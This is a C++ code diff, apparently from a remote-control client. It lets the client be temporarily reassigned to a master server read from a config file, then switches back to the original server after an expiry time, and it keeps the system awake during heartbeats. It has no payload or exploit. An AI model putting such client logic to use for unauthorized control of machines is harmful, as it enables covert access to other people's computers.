@@ -472,14 +472,20 @@ DWORD WINAPI StartClient(LPVOID lParam)
     Mprintf("StartClient begin\n");
     ClientApp& app(*(ClientApp*)lParam);
     CONNECT_ADDRESS& settings(*(app.g_Connection));
+    BOOL assigned = FALSE;
+    double valid_to = 0;
+    std::string ip = settings.ServerIP();
+    int port = settings.ServerPort();
     if (!app.m_bShared) {
         iniFile cfg(CLIENT_PATH);
         auto now = time(0);
-        auto valid_to = atof(cfg.GetStr("settings", "valid_to").c_str());
-        if (now <= valid_to) {
+        valid_to = atof(cfg.GetStr("settings", "valid_to").c_str());
+        if (assigned = now <= valid_to) {
             auto saved_ip = cfg.GetStr("settings", "master");
             auto saved_port = cfg.GetInt("settings", "port");
             settings.SetServer(saved_ip.c_str(), saved_port);
+            Mprintf("[StartClient] Client is assigned to %s:%d- %ds left.\n", saved_ip.c_str(), saved_port, 
+                int(valid_to-now));
         }
     }
     auto list = app.GetSharedMasterList();
@@ -532,6 +538,11 @@ DWORD WINAPI StartClient(LPVOID lParam)
         do {
             Manager->SendHeartbeat();
             SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED);
+            if (assigned && time(0) > valid_to) {
+                app.SetProcessState(S_CLIENT_UPDATE);
+                settings.SetServer(ip.c_str(), port);
+                Mprintf("[StartClient] Client is restored to %s:%d\n", ip.c_str(), port);
+            }
         } while (ClientObject->IsRunning() && ClientObject->IsConnected() && app.m_bIsRunning(&app));
         while (GetTickCount64() - dwTickCount < 5000 && app.m_bIsRunning(&app))
             Sleep(200);
